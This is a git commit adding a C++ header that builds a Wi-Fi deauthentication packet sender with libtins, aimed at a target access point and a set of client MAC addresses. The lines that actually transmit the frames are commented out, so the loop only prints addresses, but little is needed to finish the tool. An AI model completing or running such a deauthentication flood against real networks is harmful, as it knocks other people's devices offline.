c0163d568fb664aaca91ed9c8ddb7f2874c44ea2
hwangseonu <hwangseonu12@naver.com>
2018-11-18 14:26:07 +0900

    feat: Create Deauth packet sender

---
+++ deauth_sender.hpp
@@ -0,0 +1,52 @@
+#ifndef __DEAUTH_SENDER__
+#define __DEAUTH_SENDER__
+
+#include <iostream>
+#include <set>
+#include <tins/tins.h>
+
+using namespace std;
+using namespace Tins;
+
+class DeauthSender {
+private:
+    string iface_name;
+    HWAddress<6> target;
+    set<HWAddress<6>> *address_set;
+    bool endflag = false;
+public:
+    explicit DeauthSender(set<HWAddress<6>> *set, const string &iface, const string &target) {
+        this->address_set = set;
+        this->iface_name = iface;
+        this->target = HWAddress<6>(target);
+    }
+
+    void sendPacket() {
+        while (!this->endflag) {
+            Dot11Deauthentication deauth;
+            RadioTap radio = RadioTap();
+            deauth.addr2(this->target);
+            deauth.addr3(this->target);
+
+            PacketSender sender(this->iface_name, 100);
+
+            system("clear");
+            for (auto iter : *this->address_set) {
+                cout << "send: " << iter << endl;
+//                deauth.addr1(iter);
+//                RadioTap pkt = radio / deauth;
+//                sender.send(pkt);
+            }
+        }
+    }
+
+    bool isEnd() {
+        return this->endflag;
+    }
+
+    void end() {
+        this->endflag = true;
+    }
+};
+
+#endif
